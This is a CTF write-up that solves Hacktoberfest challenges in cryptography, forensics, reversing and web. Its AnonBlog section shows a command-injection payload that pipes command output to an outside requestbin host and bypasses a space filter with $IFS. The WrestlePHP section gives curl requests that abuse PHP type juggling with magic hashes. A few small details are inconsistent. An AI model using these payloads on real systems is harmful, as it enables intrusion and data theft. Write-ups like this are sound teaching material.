# Gaius

Challenge Description


>hw1ui_r1ew3g_c4b3s_4ui3g_yja1jh_r43h4g
>Include your flag inside the flag format; i.e. hacktoberfest_ctf{FLAG}!

This one is a classic caeser cipher challenge.
The flag content is caeser shifted.
Upon 11th shift of the content we get 
`sh1ft_c1ph3r_n4m3d_4ft3r_jul1us_c43s4r`
And the flag is ```hacktoberfest_ctf{sh1ft_c1ph3r_n4m3d_4ft3r_jul1us_c43s4r}```



# Hex

Challenge Description

>6861636b746f626572666573745f6374667b63346e5f7930755f72333463685f746831735f73743461337d
>Decode it if you can, only non-1337 can decode it!

Decoding the hex we get
`hacktoberfest_ctf{c4n_y0u_r34ch_th1s_st4a3}`
which seems to be incorrect flag
Looking at the hint we see that we need to replace 1337 with 7337
After replacing 1337 with 7337 in hex and decoding it we get the correct flag
```hacktoberfest_ctf{c4n_y0u_r34ch_th1s_st4g3}```

# Tactile

Challenge Description
>Are you blind?? 🤨
>Include your flag inside the flag format; i.e. hacktoberfest_ctf{FLAG}!

So we get a image containing braille interpretation of flag.
Taking refernce from the braille table and checking with cyberchef we get the flag
v1su41_crypto_w1th_br41ll3
And the final flag 
```hacktober_ctf{v1su41_crypto_w1th_br41ll3}```

# BabyRSA
Challenge Description
>Can you prove our RSA implementation insecure?

We get a file with contents:

>n = 0x17488abded
>e = 0x10001
>c = [77818235039, 61072516178, 69558062856, 77849934423, 19491167803, 85304110827, 31224066597, 99373816116, 86032649390]

RsaCtfTool Comes into play.
```sh
./RsaCtfTool.py -n 0x17488abded -e 0x1001 --uncipher ciphertext```
```
We do this for every cipher text then concatenate the unciphered texts which are parts of the flags.
And we get the flag
```hacktoberfest_ctf{V3ry_34sy_RSA}```

# Unprintable

Challenge Description

>Maybe it's just that I cannot be printed 🙁

First I thought the challenge was incomplete. Later I found out that there were unprintable characters in the challenge description between the letter M and y through inspecting element containing challenge description.
>M[unprintable character here]y

At first I thought this was some whitespace encoding but it turned out to be something else.Since I had no idea what this was I checked the hints and found out that it was zero width cipher.
And through the help of an [online zero width decoder](https://offdev.net/demos/zwsp-steg-js) I got the flag

```hacktoberfest_ctf{zwsp_1s_1nv1s1bl3}```


# AnonBlog

Challenge Description
>There is a place Anonymous blog, people say you cannot share link there because it's their policy. They say sharing link leads to many security issues, though I think it's just opposite based on their specific context(their new feature)

http://nicehellonice-env.eba-p2umpa4t.us-east-1.elasticbeanstalk.com

It was a site where we can add posts through /post.
Cross Site Scripting was possible. At first I thought we use an xss payload to grab the cookie of the admin but it seemed like xss was just a rabbithole.

Checking the robots.txt of the site we find /features.txt that says
```
Newly added feature: Special Hyper Linking!
 - Automatically converts links into a hyperlink.
 - Try setting any URL in the Content, and see it!!
 NOTE: For some dumb reason, link-sharing was not allowed since day 1.
    But due to requests from the users we made it available for it. But
    you still cannot share links, so this application clones the URL
    locally (using curlY "ree--quest-TOR")*, then returns it to you
    from the application itself.
----------
*pronounced "curly requester"
```
So in my head I thought it as of
`curl https://site`
being executed whenever http/https word is used. So next step was to get code execution.

At first I tried common bypasses like `&&` `||` but since the output was not  being shown, I was not sure if the command was being executed.

So I thought of another approach to send command output to a url. I quickly setup a request bin url and crafted my payload using command substitution like

`http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)`
So what this will look like 

```sh
curl http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)
$(command|base64) get executed and base64 output would be appended to output =
curl http://requestbin.net/r/1bvgn5b1/?output=base64output
```

And through http://requestbin.net/r/1bvgn5b1?inspect I could view the requests being made to the site.

Now that we have command execution with proper output. It was time to find the flag. Actually  using space in command was blocked. So I had to use $IFS instead for every command that contains space.




For example: `$(ls -la)` became `$(ls$IFS-la)`.



I looked around and found a file named `zhululu_2e3817293fc275dbee74bd71ce6eb056_FLAG_4e4d6c332b6fe62a63afe56171fd3725.txt` which contained the flag.



Then I read the file using  `$(base64$IFS-w$IFS\0$IFS/zh*)`


```sh
Sidenote
There is \ before 0 because $IFS0 would simply escape 0 it is behaviour of $IFS to escape suffix if there is no use of symbols like -, | etc.
```

On the request bin inspect tab I recieved

```Q29uZ3JhdHMhISBZb3UgbWFkZSB0aWxsIHRoZSBmbGFnIPCfjokKCgpHcmFiIGl0LCBpdCdzIGJlbG93OgpoYWNrdG9iZXJmZXN0X2N0ZntzaGVsbF9rZWtfcmljZV9mYmY4NjE5ZmY3ZjE1NjEzOWNkYWY0ZDdlM2UwNmQ3NX0K```

Decoding the base64 we get 


```
Congrats!! You made till the flag 🎉
Grab it, it's below:
hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}
```
```hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}```






# WrestlePHP

 Challenge Description
>Can you beat PHP?

>Here's something that could help you out
>7068702e30646179676f642e78797a

Hex Decoding 7068702e30646179676f642e78797a gives php.0daygod.xyz
On visiting the site we are greeted with source code of the chall php.

```php
 <?php

    if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
        die("You are a bot, mate!");
    } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";

    $flag = array("hacktoberfest_ctf{");
    if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
        array_push($flag, "you");
    }
    
    if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
        array_push($flag, "can't");
    }
    
    if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
        array_push($flag, "see");
    }
    
    if(isset($_GET['nice']) && isset($_GET['ecin']))
        if($_GET['nice'] != $_GET['ecin']){
            if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
                array_push($flag, "what");
            }        
        }
    
    if($_POST['ctf'] == md5($_POST['ctf'])){
        array_push($flag, "this");
    }
    
    if(isset($_POST['parm']) && isset($_POST['mrap'])){
        if(md5($_POST['parm']) == md5($_POST['mrap'])){
            if($_POST['parm'] != $_POST['mrap']){
                array_push($flag, "contains!");
            }
        }
    }
    
    array_push($flag, "}");
    
    echo implode('', $flag);
    
?> 

```


So lets follow along the source and solve the puzzle.
```php
if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
       die("You are a bot, mate!");
   } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";
  ```

First things first we need set out user-agent to "Yes, I am a human."

`curl -A "Yes, I am a human." https://php.0daygod.xyz/`




```php
if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
       array_push($flag, "you");
   }
  ```
Now we need to add a header `Sagarmatha-Hacktoberfest-CTF` with value `https://hacktober.tk/`
  
`curl -A "Yes, I am a human." https://php.0daygod.xyz/ -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
  



```php
   if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
       array_push($flag, "can't");
   }
```
 we need to add a get variable hello and set its value to hi
 
`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi" -"Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
 
```php
   if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
       array_push($flag, "see");
   }
```

So here the flag part gets appended when get value of world is not equal to 0x10001 but also on the second part of if statement for it to be 0 world must be 0x10001
Luckily there is a bug for strcmp , strcasecmp where we can pass [] to bypass the check.
`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`


  
```php 
    if(isset($_GET['nice']) && isset($_GET['ecin']))
       if($_GET['nice'] != $_GET['ecin']){
           if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
               array_push($flag, "what");
           }        
       }
```


Here we need to pass two `get` params `nice` and `ecin` with different values but their sha1 values should be same in order for flag to be appended.
We use use the type juggling vulnerability here and pass two different value of nice and ecin but the  beginning part of their sha1 should match containg 0e.
From this [list](https://raw.githubusercontent.com/spaze/hashes/master/sha1.md) I was able to find such two words.
So lets pass them

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`



Similarly 
```php
if($_POST['ctf'] == md5($_POST['ctf'])){
       array_push($flag, "this");
   }
```
Here we need find simlar value of ctf like in step above and pass it by POST
`md5(0e215962017) = 0e291242476940776845150308577824`

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017"`


```php if(isset($_POST['parm']) && isset($_POST['mrap'])){
       if(md5($_POST['parm']) == md5($_POST['mrap'])){
           if($_POST['parm'] != $_POST['mrap']){
               array_push($flag, "contains!");
           }
       }
   }
```
Similarly for the last piece of code we find such two words `hello24343860700` and `hello24034989169` and pass those values to post params parm and mrap

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"`

And thus the final one liner 
`curl -sA "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"|grep -oE "Flag: hacktoberfest_ctf{.*}"`

```Flag: hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}```



# Twine

Challenge Description
>The invention of twine is at least as important as the development of stone tools for early humans.

We get a binary which asks for a password
```sh
./Twine
Enter password: aa
hacktoberfest_ctf{try_ag41n}
```
Running strings on the binary revealed the password
```./Twine 
Enter password: y0u_g0t_17
hacktoberfest_ctf{str1ngs_2_w1n}
```
```hacktoberfest_ctf{str1ngs_2_w1n}```


# I_LOVE_SO_MANY_ARGS
Challenge Description
>This song might lead you somewhere(hira thaha bhayena, flag chai hola) https://www.youtube.com/watch?v=9TgYy4H29Z4&t=14

I just opened the binary in binary ninja and saw the decompiled code

A particular line peeked my interest.
```printf(data_2068, 0x46, 0x4c, 0x41, 0x47, 0x4f, 0x48, 0x5f, 0x59, 0x45, 0x53, 0x5f, 0x49, 0x5f, 0x44, 0x49, 0x44, 0x5f, 0x49, 0x54)```
Decoding the HEX
`0x46, 0x4c, 0x41, 0x47, 0x4f, 0x48, 0x5f, 0x59, 0x45, 0x53, 0x5f, 0x49, 0x5f, 0x44, 0x49, 0x44, 0x5f, 0x49, 0x54`
`FLAGOH_YES_I_DID_IT`

```hacktoberfest_ctf{OH_YES_I_DID_IT}```

# Supply me something
Challenge Description
>Sorry, I am programmed to only argue with 1337s.

So opening the binary and reading the decompiled code I found that the program checks if the number of arguement passed is 1337 and prints the try again msg to console. So what I did was change the jne instructions to je with the help of binaryninja and then ran the binary and got the flag.
```sh
./supply_cracked
hacktoberfest_ctf{y0u_4r3_4_1337_m4t3}
```
```hacktoberfest_ctf{y0u_4r3_4_1337_m4t3}```

# Facebook Archive

Challenge Description

>One of our challenge authors shared the post from our event page on Facebook just 12 hours before his presentation. Can you exfiltrate the flag from what he shared?

I just happened to have seen Binit share this [post](https://www.facebook.com/InternetHeroBINIT/posts/1306227643070983).
Checking the post and its comments there was no sign of flag.
Then I checked the edit history of the post and found the flag.

```hacktoberfest_ctf{h0w_4b0u7_sh4r3d_p0s7_3d17_h1st0ry}```


# Tweet tweet 🐦
Challenge Description
>🎶 Chari maryo sisai ko golli le 🎶
>🎶 Maya basyo tyo mitho boli le 🎶
>🎶 Maya sathai ma 🎶
>🎶 Udayo rellai le 🎶
>🎶🎶 Udayo rellai le 🎶🎶
>🎶🎶 Udayo rellai le.. 🎶🎶
>Challenge by Captain Nick Lucifer

Both from the lyrics of the song and the emoji of a bird it was clear that it was an reference to twitter.
Also there was link to challenge author's twitter handle.
The most recent tweet on the profile was the link to `https://w38-ho0k.000webhostapp.com/`

Visiting the website it seemed that content has been removed.
So I checked [Wayback Machine](web.archive.org) to find the removed content. In the web archive I found following assets
>https://w38-ho0k.000webhostapp.com/
>https://w38-ho0k.000webhostapp.com/index.css
>https://w38-ho0k.000webhostapp.com/flag.mp4
>https://w38-ho0k.000webhostapp.com/noflag.png
>https://w38-ho0k.000webhostapp.com/index.js

At first I checked the image file and ran all of steg forensics in it but did not find anything. The js and css file also seemed normal. So the last file that remained to be checked was `flag.mp4`.
First I did some low hanging operations like checking metadata but did not find anything.
The video file did have the same noflag.png embeded in it.
AFter these operations I extracted all the frames from the video using ffmpeg.
`ffmpeg -i noflag.mp4 frames/out-%03d.jpg`
Then I manually checked through every frame and in one of the frames flag was seen.
I wrote down the flag and submitted it.
```hacktoberfest_ctf{rickrolled_for_the_flag}```


# CTF 101

Challenge Description

>Only the people who attended the presentation on "Getting Started with CTF 101" can solve this challenge. Did you attend?

This was the simplest challenge in the CTF. The flag was shown in the endscreen during the presentation.


# I Cee Macha Pokhari, where cow spoke

Challenge Description
It seemed that a trader sold a cow in 127.0.0.1, becuase it could speak. Pople say, it was a lie to sell the cow. Can you find out, if the cow did speak for real?

I downloaded the pcapng file and loaded it in wireshark.
Since the challenge description said 127.0.0.1.
I used the filter 
`ip.addr==127.0.0.1`
Looking through the filtered results I saw readable text in ICMP packets so I updated my filter
`ip.addr==127.0.0.1 and icmp`
Looking through the packets I saw Cow Esolang.
Then I concatenated all the Cow esolang sections and decoded it through an [online intepreter](https://tio.run/#cow) and got the flag.

```hacktoberfest_ctf{kassam_gai_le_bolyoo_ma_dhateko_hoina}```


# Not a Script Kiddie 

We were provided with a file. `Not-a-Script-Kiddie` 
Running file we find out that its a zip file.
```sh
file Not-A-Script-Kiddie 
Not-A-Script-Kiddie: Zip archive data, at least v2.0 to extract
```
After unzipping the file I found out that it was nested multiple times with the same name `Not-A-Script-Kiddie`
So I ran a simple while loop to unzip nested zip.
```sh
while true; do echo y | unzip Not-A-Script-Kiddie; done
```
After a while I saw that the loop had returned a error message saying it was unable to extract the zip. So I checked the file, it was actually a different file with zip headers.
The head part of the file read:
>#This is a shell archive (produced by GNU sharutils 4.15.2).
>#To extract the files from this archive, save it to some FILE, remove
>#everything before the '#!/bin/sh' line above, then type 'sh FILE'.
Then I did as told and ran
```sh
sh Not-A-Script-Kiddie
x - created lock directory _sh16830.
x - extracting CKsibzcccS (text)
x - removed lock directory _sh16830.
```
It created a new file that was  LZMA compressed.
I renamed it to `lzma.xz` and ran
```sh
unxz lzma.xz
```
which then extracted a tar file and upon extracting the tar file
It created a new directory with a new shell archive file.
Upon extracting the shell archive file I got lzma file.
Thus I realized that this process had been been done recursively to encode the file.
So I wrote a script to automate this extracting process
```py
#lzma => tar => folder/sharcl


import os, time
os.chdir('/tmp/workdir')                           #This directory contains lzma file

while True:
	initialfile = (os.listdir()[0])   				#Gets LZMA file from /tmp/workdir
   
	os.rename(initialfile,"lzma.xz")  				#Renames the LZMA file to lzma.xz
	newfile = (os.listdir()[0])						#Gets renamed file,             
	os.system("unxz "+newfile)						#Unxzing renamed file
	

	tarfile = "lzma"								#Unxzing lzma.xz gives lzma(which is a tar file)
	os.rename(tarfile,"ok.tar")
	os.system("tar xvf "+"ok.tar")					#Untar the tar	
	
	directory = next(os.walk('.'))[1][0]			#Untarring makes a directory with shar file
	os.chdir('./'+directory)						#Go to the directory
	
	sharfile = (os.listdir()[0])					#Get shar file name
	os.system("sh "+sharfile)						#Execute it and extract lzma
	os.system("rm "+sharfile)						#Delete the shar file
```
After running the script for a while I found a filenamed hello.txt with flag in it.

```hacktoberfest_ctf{scr1pt1ng_1s_sup3r_h3lpful}```
